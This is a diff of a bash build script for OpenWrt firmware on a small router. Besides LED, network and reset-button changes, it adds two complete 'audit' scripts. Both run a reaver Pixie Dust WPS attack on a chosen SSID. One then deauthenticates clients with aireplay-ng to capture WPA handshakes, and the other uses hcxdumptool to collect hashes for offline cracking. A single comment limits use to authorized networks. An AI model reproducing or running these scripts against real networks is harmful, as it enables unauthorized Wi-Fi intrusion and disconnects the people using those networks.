@@ -1,5 +1,6 @@
 #!/bin/bash
-# 连乐2 v4：交换机全口(0 1 2 3 4) + LED 14/15/16 + SUPPORTED_DEVICES + iperf3
+# 连乐2 v5 终版：网口指示灯 + 长按复位恢复出厂 + 无线审计脚本(audit-air / audit-hcx)
+# 基于 v4（已实机验证结构：交换机 0-4、LED 14/15/16、复位 17、SUPPORTED_DEVICES、iperf3）
 set -e
 
 WS="${GITHUB_WORKSPACE:-$(cd .. && pwd)}"
@@ -40,7 +41,7 @@ add_cfg CONFIG_PACKAGE_iperf3
 sed -i '/CONFIG_PACKAGE_luci-network=y/d; /CONFIG_PACKAGE_luci-system=y/d' "$CFG" 2>/dev/null || true
 echo "==> .config 已补包"
 
-# ---------- 3. 设备定义：补 SUPPORTED_DEVICES ----------
+# ---------- 3. 设备定义 ----------
 GMK="$SRC/target/linux/ath79/image/generic.mk"
 if grep -q "^define Device/lelink_le2$" "$GMK"; then
 	sed -i '/^define Device\/lelink_le2$/,/^TARGET_DEVICES += lelink_le2$/d' "$GMK"
@@ -48,7 +49,6 @@ fi
 cat >> "$GMK" << 'EOF'
 
 # 连乐2：沿用上游乐视 LBA-047-CH 的 DTS 与 OKLI 引导方案
-# 交换机端口：0=CPU(AR8228)，1/2 空，3/4 为两个物理网口
 define Device/lelink_le2
   $(Device/loader-okli-uimage)
   SOC := qca9531
@@ -68,31 +68,26 @@ define Device/lelink_le2
 endef
 TARGET_DEVICES += lelink_le2
 EOF
-echo "==> 设备定义已写入（含 SUPPORTED_DEVICES）"
+echo "==> 设备定义已写入"
 
-# ---------- 4. 改 DTS：LED 用实测的 14/15/16，高电平有效 ----------
+# ---------- 4. DTS：LED 14/15/16 高有效 ----------
 DTS="$SRC/target/linux/ath79/dts/qca9531_letv_lba-047-ch.dts"
 [ -f "$DTS" ] || { echo "!! 找不到 DTS"; exit 1; }
 python3 - "$DTS" << 'PY'
-import re,sys
-p=sys.argv[1]
-s=open(p).read()
-# LED0: 13 -> 14，高有效；LED1: 4 -> 15；LED2: 11 -> 16
+import subprocess,sys
+p=sys.argv[1]; s=open(p).read()
 s=s.replace('<&gpio 13 GPIO_ACTIVE_LOW>','<&gpio 14 GPIO_ACTIVE_HIGH>')
 s=s.replace('<&gpio 4 GPIO_ACTIVE_LOW>','<&gpio 15 GPIO_ACTIVE_HIGH>')
 s=s.replace('<&gpio 11 GPIO_ACTIVE_LOW>','<&gpio 16 GPIO_ACTIVE_HIGH>')
-# 名字改成信号格
 s=s.replace('label = "blue:status"','label = "green:signal1"')
 s=s.replace('label = "green:status"','label = "green:signal2"')
 s=s.replace('label = "red:status"','label = "green:signal3"')
 open(p,'w').write(s)
-# 校验
-import subprocess
 print(subprocess.run(['grep','-n','gpios',p],capture_output=True,text=True).stdout)
 PY
 echo "==> DTS 已改"
 
-# ---------- 5. 网络：交换机全口 0 1 2 3 4（3/4 才是物理网口） ----------
+# ---------- 5. 网络（两口都 LAN，中继形态） ----------
 mkdir -p "$SRC/files/etc/uci-defaults"
 cat > "$SRC/files/etc/uci-defaults/99-le2-net" << 'EOF'
 #!/bin/sh
@@ -128,7 +123,7 @@ exit 0
 EOF
 chmod +x "$SRC/files/etc/uci-defaults/99-le2-net"
 
-# ---------- 6. WiFi / 时区 / nodogsplash ----------
+# ---------- 6. WiFi / 时区 ----------
 cat > "$SRC/files/etc/uci-defaults/99-le2-wifi" << 'EOF'
 #!/bin/sh
 [ -f /etc/config/wireless ] || wifi config >/dev/null 2>&1
@@ -142,80 +137,239 @@ if [ -f /etc/config/wireless ]; then
 fi
 exit 0
 EOF
-chmod +x "$SRC/files/etc/uci-defaults/99-le2-wifi"
-
 cat > "$SRC/files/etc/uci-defaults/99-le2-tz" << 'EOF'
 #!/bin/sh
 uci -q set system.@system[0].timezone='CST-8' || true
 uci -q set system.@system[0].zonename='Asia/Shanghai' || true
 uci -q set system.@system[0].ntp='1' || true
-uci -q set system.ntp='timeserver' || true
 uci -q commit system
 [ -x /etc/init.d/nodogsplash ] && /etc/init.d/nodogsplash disable 2>/dev/null
 exit 0
 EOF
-chmod +x "$SRC/files/etc/uci-defaults/99-le2-tz"
+chmod +x "$SRC/files/etc/uci-defaults/99-le2-wifi" "$SRC/files/etc/uci-defaults/99-le2-tz"
 
-# ---------- 7. GPIO 扫描工具 ----------
-mkdir -p "$SRC/files/usr/bin"
-cat > "$SRC/files/usr/bin/led-scan" << 'EOF'
+# ---------- 7. 复位键：短按重启 / 长按 5 秒恢复出厂 ----------
+mkdir -p "$SRC/files/etc/rc.button"
+cat > "$SRC/files/etc/rc.button/reset" << 'EOF'
 #!/bin/sh
-G=/sys/class/gpio
-[ -d $G ] || { echo "no $G"; exit 1; }
-echo "扫描 GPIO 0-22，每个亮 2 秒，记录亮灯编号（14/15/16 是信号灯，已被占用会跳过）"
-for i in 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22; do
-	echo $i > $G/export 2>/dev/null || continue
-	echo out > $G/gpio$i/direction 2>/dev/null || { echo $i > $G/unexport; continue; }
-	echo 1 > $G/gpio$i/value 2>/dev/null
-	echo "===== GPIO $i ====="
-	sleep 2
-	echo 0 > $G/gpio$i/value 2>/dev/null
-	echo $i > $G/unexport 2>/dev/null
-done
+# 短按 -> 重启；按住 >=5 秒 -> 恢复出厂(firstboot)
+FLAG=/tmp/le2-reset-hold
+case "$ACTION" in
+press|pressed)
+	rm -f "$FLAG"
+	echo pressed > "$FLAG"
+	( sleep 5; [ -f "$FLAG" ] && echo hold > "$FLAG" ) &
+	;;
+timeout)
+	echo hold > "$FLAG"
+	logger -t le2-reset "长按 5 秒：恢复出厂"
+	firstboot -y
+	reboot
+	;;
+release|released)
+	if [ "$(cat "$FLAG" 2>/dev/null)" = "hold" ]; then
+		rm -f "$FLAG"
+		logger -t le2-reset "长按：恢复出厂"
+		firstboot -y
+		reboot
+	else
+		rm -f "$FLAG"
+		logger -t le2-reset "短按：重启"
+		reboot
+	fi
+	;;
+esac
 EOF
-chmod +x "$SRC/files/usr/bin/led-scan"
+chmod +x "$SRC/files/etc/rc.button/reset"
 
-cat > "$SRC/files/usr/bin/btn-scan" << 'EOF'
-#!/bin/sh
-# 简化版：先打印全部输入电平，再提示按键，第二次打印，靠肉眼比对
-G=/sys/class/gpio
-L="0 1 2 3 4 5 6 7 8 9 10 11 12 13 17 18 19 20 21 22"
-scan() {
-	for i in $L; do
-		echo $i > $G/export 2>/dev/null
-		echo in > $G/gpio$i/direction 2>/dev/null || continue
-		echo "G$i=$(cat $G/gpio$i/value 2>/dev/null)"
-	done
-}
-echo "----- 未按下 -----"
-scan
-echo "----- 现在按住复位键 10 秒 -----"
-sleep 10
-echo "----- 按住中 -----"
-scan
-echo "对比两段，值变了的那行就是复位键"
-EOF
-chmod +x "$SRC/files/usr/bin/btn-scan"
-
-# ---------- 8. rc.local ----------
+# ---------- 8. rc.local：网口指示灯 + 交换机兜底 + 诊断 ----------
 cat > "$SRC/files/etc/rc.local" << 'EOF'
 #!/bin/sh
-sleep 5
-for i in eth0 eth1; do
-	ip link set $i master br-lan 2>/dev/null || true
-done
+for i in $(seq 1 20); do [ -d /sys/class/net/br-lan ] && break; sleep 1; done
+
 swconfig dev switch0 set enable_vlan 1 2>/dev/null
 swconfig dev switch0 vlan 1 set ports "0 1 2 3 4" 2>/dev/null
+
+L=/sys/class/leds
+if [ -d "$L/green:signal1" ]; then
+	echo netdev > "$L/green:signal1/trigger" 2>/dev/null
+	echo eth0 > "$L/green:signal1/device_name" 2>/dev/null
+	echo 1 > "$L/green:signal1/link" 2>/dev/null
+	echo 0 > "$L/green:signal1/tx" 2>/dev/null
+	echo 0 > "$L/green:signal1/rx" 2>/dev/null
+fi
+if [ -d "$L/green:signal2" ]; then
+	echo netdev > "$L/green:signal2/trigger" 2>/dev/null
+	echo eth0 > "$L/green:signal2/device_name" 2>/dev/null
+	echo 1 > "$L/green:signal2/tx" 2>/dev/null
+	echo 1 > "$L/green:signal2/rx" 2>/dev/null
+	echo 0 > "$L/green:signal2/link" 2>/dev/null
+fi
+if [ -d "$L/green:signal3" ]; then
+	echo none > "$L/green:signal3/trigger" 2>/dev/null
+	echo 0 > "$L/green:signal3/brightness" 2>/dev/null
+fi
+
 { echo "=== swconfig ==="; swconfig dev switch0 show 2>&1;
   echo "=== brctl ==="; brctl show 2>&1;
   echo "=== speed ==="; cat /sys/class/net/eth0/speed /sys/class/net/eth1/speed 2>&1;
+  echo "=== leds ==="; ls /sys/class/leds 2>&1;
   echo "=== network ==="; cat /etc/config/network 2>&1; } > /www/diag-net.txt 2>&1
 exit 0
 EOF
 chmod +x "$SRC/files/etc/rc.local"
 
-# ---------- 9. 自检 ----------
+# ---------- 9. 审计脚本：audit-air ----------
+mkdir -p "$SRC/files/usr/bin"
+cat > "$SRC/files/usr/bin/audit-air" << 'EOF'
+#!/bin/sh
+# audit-air —— 连乐2(ath9k) 一键握手：仙尘首战 + airodump 抓包
+# 用法：TAG=目标SSID audit-air     （可选 CH=6 W=60 PWT=60）
+# 只用在自己/授权的网络。脚本会先关无线，请用有线 SSH 控制。
+TAG="${TAG:?ABORT01 需要 TAG=目标SSID}"
+CH="${CH:-0}"; W="${W:-60}"; PWT="${PWT:-60}"
+OUT=/www/audit; FIN=/root/audit-out
+mkdir -p "$OUT" "$FIN"
+
+for b in iw airodump-ng aireplay-ng aircrack-ng reaver; do
+	command -v $b >/dev/null || { echo "ABORT10 缺 $b"; exit 10; }
+done
+
+PHY=$(iw phy 2>/dev/null | awk '/^Wiphy phy/{print $2; exit}')
+[ -n "$PHY" ] || { echo "ABORT13 找不到 phy"; exit 13; }
+echo "[*] phy=$PHY 目标=$TAG"
+
+wifi down 2>/dev/null; sleep 2
+iw dev mon0 del 2>/dev/null
+iw phy "$PHY" interface add mon0 type monitor || { echo "ABORT19 建 monitor 失败"; exit 19; }
+ip link set mon0 up || { echo "ABORT19 拉起 mon0 失败"; exit 19; }
+
+echo "[*] 扫描目标"
+iw dev mon0 scan 2>/dev/null > "$OUT/scan.txt"
+SSIDLINE=$(grep -n "SSID: $TAG$" "$OUT/scan.txt" | head -1 | cut -d: -f1)
+[ -n "$SSIDLINE" ] || { echo "ABORT16 扫不到 $TAG（换位置再试）"; iw dev mon0 del; wifi up; exit 16; }
+BSS=$(sed -n "1,${SSIDLINE}p" "$OUT/scan.txt" | grep -oE "BSS [0-9a-f:]{17}" | tail -1 | awk '{print $2}')
+FREQ=$(sed -n "${SSIDLINE},$((SSIDLINE+25))p" "$OUT/scan.txt" | grep -oE "freq: [0-9]+" | head -1 | awk '{print $2}')
+if [ "$CH" = "0" ]; then
+	case ${FREQ:-2437} in
+	2412) CH=1;; 2417) CH=2;; 2422) CH=3;; 2427) CH=4;; 2432) CH=5;;
+	2437) CH=6;; 2442) CH=7;; 2447) CH=8;; 2452) CH=9;; 2457) CH=10;;
+	2462) CH=11;; 2467) CH=12;; 2472) CH=13;; *) CH=6;;
+	esac
+fi
+echo "[*] BSSID=$BSS 信道=$CH"
+iw dev mon0 set channel "$CH" 2>/dev/null
+killall wpa_supplicant hostapd 2>/dev/null
+
+echo "[*] 仙尘首战（最多 ${PWT}s）"
+timeout ${PWT}s reaver -i mon0 -b "$BSS" -K 1 -N -vv > "$OUT/pixie.log" 2>&1
+if grep -qiE "WPS PIN|Password|key" "$OUT/pixie.log"; then
+	echo "[+] 仙尘出结果："; grep -iE "WPS PIN|Password|key" "$OUT/pixie.log"
+else
+	echo "[-] 仙尘空，转抓包"
+fi
+
+BIN="$OUT/$TAG-$(date +%H%M%S)"
+echo "[*] airodump 抓包 ${W}s，每 10s 踢一次人"
+airodump-ng -c "$CH" --bssid "$BSS" -w "$BIN" mon0 > "$OUT/airodump.log" 2>&1 &
+AID=$!
+t=0
+while [ $t -lt $W ]; do
+	sleep 10; t=$((t+10))
+	aireplay-ng -0 5 -a "$BSS" mon0 >/dev/null 2>&1
+	CAP=$(ls "$BIN"-01.cap 2>/dev/null)
+	if [ -n "$CAP" ] && aircrack-ng "$CAP" < /dev/null 2>&1 | grep -qE "WPA \([1-9]"; then
+		echo "[+] 第 ${t}s 命中握手"; break
+	fi
+done
+kill $AID 2>/dev/null; sleep 1
+CAP=$(ls "$BIN"-01.cap 2>/dev/null)
+if [ -n "$CAP" ]; then
+	cp "$CAP" "$FIN/" 2>/dev/null
+	echo "[*] 包：$CAP（已复制到 $FIN/）"
+	aircrack-ng "$CAP" < /dev/null 2>&1 | grep -E "WPA|BSSID" | head -3
+fi
+iw dev mon0 del 2>/dev/null
+wifi up 2>/dev/null
+echo "[*] 结束，无线已恢复"
+EOF
+chmod +x "$SRC/files/usr/bin/audit-air"
+
+# ---------- 10. 审计脚本：audit-hcx ----------
+cat > "$SRC/files/usr/bin/audit-hcx" << 'EOF'
+#!/bin/sh
+# audit-hcx —— 连乐2(ath9k) 一键：仙尘首战 + hcxdumptool 抓包
+# 用法：TAG=目标SSID audit-hcx     （可选 CH=6 W=60 PWT=60）
+TAG="${TAG:?ABORT01 需要 TAG=目标SSID}"
+CH="${CH:-0}"; W="${W:-60}"; PWT="${PWT:-60}"
+OUT=/www/audit; FIN=/root/audit-out
+mkdir -p "$OUT" "$FIN"
+
+for b in iw hcxdumptool hcxpcapngtool reaver; do
+	command -v $b >/dev/null || { echo "ABORT10 缺 $b"; exit 10; }
+done
+
+PHY=$(iw phy 2>/dev/null | awk '/^Wiphy phy/{print $2; exit}')
+[ -n "$PHY" ] || { echo "ABORT13 找不到 phy"; exit 13; }
+echo "[*] phy=$PHY 目标=$TAG"
+
+wifi down 2>/dev/null; sleep 2
+# hcxdumptool 要自己设 monitor，所以给它一个 managed 口；扫描也用它
+iw dev mon0 del 2>/dev/null
+iw dev hcx0 del 2>/dev/null
+iw phy "$PHY" interface add hcx0 type managed || { echo "ABORT19 建 hcx0 失败"; exit 19; }
+ip link set hcx0 up
+iw dev hcx0 scan 2>/dev/null > "$OUT/scan.txt"
+SSIDLINE=$(grep -n "SSID: $TAG$" "$OUT/scan.txt" | head -1 | cut -d: -f1)
+[ -n "$SSIDLINE" ] || { echo "ABORT16 扫不到 $TAG"; iw dev hcx0 del; wifi up; exit 16; }
+BSS=$(sed -n "1,${SSIDLINE}p" "$OUT/scan.txt" | grep -oE "BSS [0-9a-f:]{17}" | tail -1 | awk '{print $2}')
+FREQ=$(sed -n "${SSIDLINE},$((SSIDLINE+25))p" "$OUT/scan.txt" | grep -oE "freq: [0-9]+" | head -1 | awk '{print $2}')
+if [ "$CH" = "0" ]; then
+	case ${FREQ:-2437} in
+	2412) CH=1;; 2437) CH=6;; 2462) CH=11;; *) CH=6;;
+	esac
+fi
+echo "[*] BSSID=$BSS 信道=$CH"
+killall wpa_supplicant hostapd 2>/dev/null
+
+echo "[*] 仙尘首战（临时 monitor 口，最多 ${PWT}s）"
+iw phy "$PHY" interface add monpwt type monitor 2>/dev/null
+ip link set monpwt up 2>/dev/null
+iw dev monpwt set channel "$CH" 2>/dev/null
+timeout ${PWT}s reaver -i monpwt -b "$BSS" -K 1 -N -vv > "$OUT/pixie.log" 2>&1
+iw dev monpwt del 2>/dev/null
+if grep -qiE "WPS PIN|Password" "$OUT/pixie.log"; then
+	echo "[+] 仙尘出结果："; grep -iE "WPS PIN|Password" "$OUT/pixie.log"
+fi
+
+BIN="$OUT/$TAG-$(date +%H%M%S).pcapng"
+echo "[*] hcxdumptool 抓包 ${W}s（三向量）"
+hcxdumptool -i hcx0 -w "$BIN" -c "$CH" --rds=2 > "$OUT/hcx.log" 2>&1 &
+HID=$!
+t=0
+while [ $t -lt $W ]; do
+	sleep 5; t=$((t+5))
+	[ -f "$BIN" ] || continue
+	hcxpcapngtool -o "$OUT/live.hc22000" "$BIN" >/dev/null 2>&1
+	if grep -qai "$(echo $BSS | tr -d ':')" "$OUT/live.hc22000" 2>/dev/null; then
+		echo "[+] 第 ${t}s 命中记录"; break
+	fi
+done
+kill $HID 2>/dev/null; sleep 1
+hcxpcapngtool -o "$FIN/$TAG.hc22000" "$BIN" >/dev/null 2>&1
+echo "[*] 记录：$FIN/$TAG.hc22000"
+iw dev hcx0 del 2>/dev/null
+wifi up 2>/dev/null
+echo "[*] 结束，无线已恢复"
+EOF
+chmod +x "$SRC/files/usr/bin/audit-hcx"
+
+# ---------- 11. 自检 ----------
 echo "---- 设备定义 ----"; grep -A 16 'define Device/lelink_le2' "$GMK"
-echo "---- DTS LED ----"; grep -n -B1 "GPIO_ACTIVE_HIGH\|gpios = <&gpio 17" "$DTS"
-echo "---- 包 ----"; grep -E 'PACKAGE_iperf3|PACKAGE_hcxdumptool|PACKAGE_reaver' "$CFG"
+echo "---- DTS LED ----"; grep -n "gpios = <&gpio" "$DTS"
+echo "---- 脚本 ----"; ls -l "$SRC/files/usr/bin/" "$SRC/files/etc/rc.button/"
+echo "---- 审计脚本语法 ----"
+for f in "$SRC/files/usr/bin/audit-air" "$SRC/files/usr/bin/audit-hcx" "$SRC/files/etc/rc.button/reset" "$SRC/files/etc/rc.local"; do
+	if sh -n "$f"; then echo "ok $(basename $f)"; else echo "!! 语法错误 $(basename $f)"; fi
+done
 echo "==> 完成"
